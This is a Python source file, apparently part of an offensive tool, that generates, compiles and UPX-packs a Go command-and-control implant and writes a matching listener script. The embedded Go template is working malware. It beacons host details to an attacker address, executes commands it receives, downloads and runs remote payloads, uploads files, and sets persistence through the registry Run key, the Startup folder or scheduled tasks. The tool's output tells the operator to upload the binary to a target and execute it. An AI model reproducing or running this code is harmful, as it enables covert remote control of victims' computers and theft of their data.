"""
Custom C2 Implant Generator
Session verilerinden Go-based implant üretir, beaconing özelliği ekler.
"""
import os
import subprocess
import json
import base64
from dataclasses import dataclass
from typing import Optional, Dict, List
from datetime import datetime


@dataclass
class ImplantConfig:
    """C2 Implant Configuration"""
    implant_name: str = "implant"
    lhost: str = "192.168.1.100"
    lport: int = 4444
    interval: int = 30  # Beacon interval in seconds
    jitter: int = 5    # Random jitter
    encryption: str = "aes256"  # aes256, xor, none
    persistence: str = "registry"  # registry, startup, schtasks
    obfuscate: bool = False
    output_path: str = "/tmp"


@dataclass
class ImplantResult:
    success: bool
    source_file: Optional[str] = None
    binary_file: Optional[str] = None
    command: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None


class C2ImplantGenerator:
    """Go-based C2 implant generator"""
    
    IMPLANT_TEMPLATE = '''package main

import (
    "bufio"
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/hex"
    "fmt"
    "io"
    "net"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "time"
)

// Configuration
var (
    serverAddr = "{LHOST}:{LPORT}"
    beaconInterval = {INTERVAL} * time.Second
    jitter = {JITTER}
    encryptionKey = []byte("{ENCRYPTION_KEY}")
)

// Encryption functions
func encryptAES(plaintext []byte) ([]byte, error) {
    block, err := aes.NewCipher(encryptionKey)
    if err != nil {
        return nil, err
    }
    
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    nonce := make([]byte, gcm.NonceSize())
    if _, err := rand.Read(nonce); err != nil {
        return nil, err
    }
    
    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
    return ciphertext, nil
}

func decryptAES(ciphertext []byte) ([]byte, error) {
    block, err := aes.NewCipher(encryptionKey)
    if err != nil {
        return nil, err
    }
    
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    nonceSize := gcm.NonceSize()
    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    
    return gcm.Open(nil, nonce, ciphertext, nil)
}

func xorEncrypt(data []byte, key byte) []byte {
    result := make([]byte, len(data))
    for i, b := range data {
        result[i] = b ^ key
    }
    return result
}

// HTTP request to C2 server
func sendToC2(endpoint string, data []byte) ([]byte, error) {
    conn, err := net.Dial("tcp", serverAddr)
    if err != nil {
        return nil, err
    }
    defer conn.Close()
    
    fullData := append([]byte(endpoint+":"), data...)
    
    if {ENCRYPTED} {
        encrypted, err := encryptAES(fullData)
        if err != nil {
            return nil, err
        }
        _, err = conn.Write(encrypted)
        if err != nil {
            return nil, err
        }
    } else {
        _, err = conn.Write(fullData)
        if err != nil {
            return nil, err
        }
    }
    
    response := make([]byte, 4096)
    n, err := conn.Read(response)
    if err != nil {
        return nil, err
    }
    
    if {ENCRYPTED} {
        return decryptAES(response[:n])
    }
    return response[:n], nil
}

// Execute command
func executeCommand(cmd string) string {
    parts := strings.Fields(cmd)
    if len(parts) == 0 {
        return "No command specified"
    }
    
    executable := parts[0]
    args := parts[1:]
    
    command := exec.Command(executable, args...)
    stdout, err := command.Output()
    if err != nil {
        errMsg := err.Error()
        if stderr, ok := err.(*exec.ExitError); ok {
            errMsg += "\\n" + string(stderr.Stderr)
        }
        return "Error: " + errMsg
    }
    
    return string(stdout)
}

// Check if file exists
func fileExists(path string) bool {
    _, err := os.Stat(path)
    return !os.IsNotExist(err)
}

// Download and execute file
func downloadAndExecute(url string) string {
    resp, err := http.Get(url)
    if err != nil {
        return "Download failed: " + err.Error()
    }
    defer resp.Body.Close()
    
    if resp.StatusCode != 200 {
        return fmt.Sprintf("HTTP error: %d", resp.StatusCode)
    }
    
    data, err := io.ReadAll(resp.Body)
    if err != nil {
        return "Read failed: " + err.Error()
    }
    
    // Write to temp and execute
    tmpPath := filepath.Join(os.TempDir(), "payload.exe")
    err = os.WriteFile(tmpPath, data, 0755)
    if err != nil {
        return "Write failed: " + err.Error()
    }
    
    cmd := exec.Command(tmpPath)
    cmd.Start()
    
    return "Downloaded and executed: " + tmpPath
}

// Upload file to server
func uploadFile(path string) error {
    data, err := os.ReadFile(path)
    if err != nil {
        return err
    }
    
    _, err = sendToC2("UPLOAD:"+path, data)
    return err
}

// Persistence - Registry
func addRegistryPersistence() {
    cmd := `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {IMPLANT_NAME} /t REG_SZ /d "` + os.Args[0] + `" /f`
    exec.Command("cmd", "/C", cmd).Run()
}

// Persistence - Startup
func addStartupPersistence() {
    exePath, _ := os.Executable()
    startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{IMPLANT_NAME}.lnk")
    // Create shortcut (simplified)
    os.WriteFile(startupPath+".bat", []byte("@echo off\\n"+exePath), 0644)
}

// Persistence - Scheduled Task
func addSchtasksPersistence() {
    exePath, _ := os.Executable()
    cmd := fmt.Sprintf(`schtasks /create /sc minute /mo 30 /tn "{IMPLANT_NAME}" /tr "%s" /f`, exePath)
    exec.Command("cmd", "/C", cmd).Run()
}

func main() {
    // Add persistence
    switch "{PERSISTENCE}" {
    case "registry":
        addRegistryPersistence()
    case "startup":
        addStartupPersistence()
    case "schtasks":
        addSchtasksPersistence()
    }
    
    hostname, _ := os.Hostname()
    
    for {
        // Beacon with system info
        beaconData := fmt.Sprintf("BEACON|hostname=%s|pid=%d|user=%s", hostname, os.Getpid(), os.Getenv("USERNAME"))
        response, err := sendToC2("BEACON", []byte(beaconData))
        if err != nil {
            time.Sleep(beaconInterval)
            continue
        }
        
        // Execute commands from response
        cmd := strings.TrimSpace(string(response))
        if strings.HasPrefix(cmd, "CMD:") {
            actualCmd := strings.TrimPrefix(cmd, "CMD:")
            result := executeCommand(actualCmd)
            sendToC2("RESULT", []byte(result))
        } else if strings.HasPrefix(cmd, "DOWNLOAD:") {
            url := strings.TrimPrefix(cmd, "DOWNLOAD:")
            result := downloadAndExecute(url)
            sendToC2("RESULT", []byte(result))
        } else if cmd == "UPLOAD" {
            // Wait for file path
            time.Sleep(1 * time.Second)
            uploadFile("C:\\\\Users\\\\Public\\\\Documents\\\\test.txt")
        } else if cmd == "EXIT" {
            break
        }
        
        // Random jitter
        time.Sleep(time.Duration(jitter) * time.Second)
    }
}
'''

    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
    
    def generate_implant(self, config: ImplantConfig) -> ImplantResult:
        """
        Go implant kaynak kodu üretir.
        
        Args:
            config: Implant konfigürasyonu
        
        Returns:
            ImplantResult: Üretim sonucu
        """
        try:
            # Encryption key oluştur (32 byte for AES-256)
            encryption_key = os.urandom(32).hex()[:32]
            
            # Template'i doldur
            source_code = self.IMPLANT_TEMPLATE
            source_code = source_code.replace("{LHOST}", config.lhost)
            source_code = source_code.replace("{LPORT}", str(config.lport))
            source_code = source_code.replace("{INTERVAL}", str(config.interval))
            source_code = source_code.replace("{JITTER}", str(config.jitter))
            source_code = source_code.replace("{ENCRYPTION_KEY}", encryption_key)
            source_code = source_code.replace("{IMPLANT_NAME}", config.implant_name)
            source_code = source_code.replace("{PERSISTENCE}", config.persistence)
            
            # Encryption ayarı
            if config.encryption == "none":
                source_code = source_code.replace("{ENCRYPTED}", "false")
            else:
                source_code = source_code.replace("{ENCRYPTED}", "true")
            
            # Go import ekle
            if config.encryption != "none":
                source_code = source_code.replace(
                    '"net"',
                    '"crypto/aes"\\n    "crypto/cipher"\\n    "crypto/rand"\\n    "encoding/base64"\\n    "net"'
                )
            
            # Dosyaya yaz
            source_file = os.path.join(config.output_path, f"{config.implant_name}.go")
            with open(source_file, "w") as f:
                f.write(source_code)
            
            return ImplantResult(
                success=True,
                source_file=source_file,
                command=f"go build -o {config.implant_name} {source_file}",
                output=f"Source code written to {source_file}"
            )
            
        except Exception as e:
            return ImplantResult(
                success=False,
                error=str(e)
            )
    
    def compile_implant(self, source_file: str, output_file: str = None) -> ImplantResult:
        """
        Go kaynak kodunu derler.
        
        Args:
            source_file: Go kaynak dosya yolu
            output_file: Çıktı dosya yolu
        
        Returns:
            ImplantResult: Derleme sonucu
        """
        try:
            if output_file is None:
                output_file = source_file.replace(".go", ".exe")
            
            # Go'nun kurulu olup olmadığını kontrol et
            result = subprocess.run(
                ["which", "go"],
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                # Cross-compilation için Linux binary
                output_file = source_file.replace(".go", "")
                compile_cmd = [
                    "go", "build",
                    "-ldflags", "-s -w",
                    "-o", output_file,
                    source_file
                ]
            else:
                # Windows için derle
                if not output_file.endswith(".exe"):
                    output_file += ".exe"
                
                compile_cmd = [
                    "go", "build",
                    "-ldflags", "-s -w",
                    "-o", output_file,
                    source_file
                ]
            
            compile_result = subprocess.run(
                compile_cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if compile_result.returncode != 0:
                return ImplantResult(
                    success=False,
                    error=f"Compilation failed: {compile_result.stderr}"
                )
            
            return ImplantResult(
                success=True,
                source_file=source_file,
                binary_file=output_file,
                command=" ".join(compile_cmd),
                output=f"Binary compiled: {output_file}"
            )
            
        except subprocess.TimeoutExpired:
            return ImplantResult(
                success=False,
                error="Compilation timeout (120s)"
            )
        except Exception as e:
            return ImplantResult(
                success=False,
                error=str(e)
            )
    
    def create_full_implant(self, config: ImplantConfig) -> ImplantResult:
        """
        Tam implant oluşturur: kaynak kod + derleme.
        
        Args:
            config: Implant konfigürasyonu
        
        Returns:
            ImplantResult: Sonuç
        """
        # Kaynak kod üret
        gen_result = self.generate_implant(config)
        
        if not gen_result.success:
            return gen_result
        
        # Derle
        compile_result = self.compile_implant(
            gen_result.source_file,
            os.path.join(config.output_path, config.implant_name)
        )
        
        if not compile_result.success:
            return compile_result
        
        # Binary obfuscation (varsa)
        if config.obfuscate:
            obf_result = self._obfuscate_binary(compile_result.binary_file)
            if obf_result.success:
                compile_result.binary_file = obf_result.binary_file
        
        return compile_result
    
    def _obfuscate_binary(self, binary_path: str) -> ImplantResult:
        """
        Binary'yi obfuscate eder (UPX vb.).
        """
        try:
            result = subprocess.run(
                ["which", "upx"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                obf_path = binary_path + ".packed"
                subprocess.run(
                    ["upx", "-9", "-o", obf_path, binary_path],
                    capture_output=True,
                    timeout=60
                )
                
                if os.path.exists(obf_path):
                    os.remove(binary_path)
                    os.rename(obf_path, binary_path)
            
            return ImplantResult(
                success=True,
                binary_file=binary_path,
                output="Binary may be obfuscated"
            )
            
        except Exception as e:
            return ImplantResult(
                success=False,
                error=str(e)
            )
    
    def get_listener_template(self, lhost: str, lport: int) -> str:
        """
        C2 listener script template'i döndürür.
        """
        return f'''#!/usr/bin/env python3
"""
C2 Listener for {lhost}:{lport}
Prof.Attack-Tool Generated
"""

import socket
import threading
import base64
from datetime import datetime

class C2Listener:
    def __init__(self, host='{lhost}', port={lport}):
        self.host = host
        self.port = port
        self.agents = {{}}
        self.commands = {{
            "BEACON": self.handle_beacon,
            "RESULT": self.handle_result,
            "UPLOAD": self.handle_upload
        }}
    
    def handle_beacon(self, data, addr):
        """Handle beacon from implant"""
        parts = data.split("|")
        info = {{
            "hostname": parts[1].split("=")[1] if len(parts) > 1 else "unknown",
            "pid": parts[2].split("=")[1] if len(parts) > 2 else "0",
            "user": parts[3].split("=")[1] if len(parts) > 3 else "unknown"
        }}
        self.agents[addr] = info
        print(f"[*] Beacon from {{info['hostname']}} ({{addr[0]}}:{{addr[1]}})")
        return "CMD:whoami"  # Default command
    
    def handle_result(self, data, addr):
        """Handle command result"""
        print(f"[*] Result from {{addr}}:")
        print(data)
        return ""
    
    def handle_upload(self, data, addr):
        """Handle file upload"""
        return ""
    
    def start(self):
        """Start listener"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[*] C2 Listener started on {{self.host}}:{{self.port}}")
        
        while True:
            client, addr = server.accept()
            threading.Thread(target=self.handle_client, args=(client, addr)).start()
    
    def handle_client(self, client, addr):
        """Handle client connection"""
        try:
            while True:
                data = client.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                
                print(f"[*] Data from {{addr}}: {{data[:100]}}")
                
                # Process command
                for prefix, handler in self.commands.items():
                    if data.startswith(prefix):
                        response = handler(data, addr)
                        if response:
                            client.send(response.encode())
                        break
                        
        except Exception as e:
            print(f"[!] Error: {{e}}")
        finally:
            client.close()

if __name__ == "__main__":
    listener = C2Listener()
    listener.start()
'''
    
    def save_listener(self, lhost: str, lport: int, output_path: str = "/tmp") -> str:
        """
        C2 listener scriptini kaydeder.
        """
        template = self.get_listener_template(lhost, lport)
        filepath = os.path.join(output_path, f"c2_listener_{lport}.py")
        
        with open(filepath, "w") as f:
            f.write(template)
        
        os.chmod(filepath, 0o755)
        
        return filepath


# CLI function
def generate_c2_from_session(
    session_data: Dict,
    output_path: str = "/tmp"
) -> Dict:
    """
    Session verilerinden C2 implant üretir.
    
    Args:
        session_data: Session bilgileri (host, port, user vb.)
        output_path: Çıktı dizini
    
    Returns:
        Dict: Üretim sonuçları
    """
    config = ImplantConfig(
        implant_name=session_data.get("name", "implant"),
        lhost=session_data.get("lhost", "192.168.1.100"),
        lport=session_data.get("lport", 4444),
        interval=session_data.get("interval", 30),
        jitter=session_data.get("jitter", 5),
        encryption=session_data.get("encryption", "aes256"),
        persistence=session_data.get("persistence", "registry"),
        obfuscate=session_data.get("obfuscate", False),
        output_path=output_path
    )
    
    generator = C2ImplantGenerator()
    
    # Implant üret
    implant_result = generator.create_full_implant(config)
    
    # Listener kaydet
    listener_path = generator.save_listener(
        config.lhost,
        config.lport,
        output_path
    )
    
    return {
        "success": implant_result.success,
        "source_file": implant_result.source_file,
        "binary_file": implant_result.binary_file,
        "listener_file": listener_path,
        "error": implant_result.error,
        "config": {
            "lhost": config.lhost,
            "lport": config.lport,
            "interval": config.interval,
            "encryption": config.encryption,
            "persistence": config.persistence
        },
        "usage": {
            "start_listener": f"python3 {listener_path}",
            "deploy_implant": f"Upload {implant_result.binary_file} to target and execute"
        }
    }
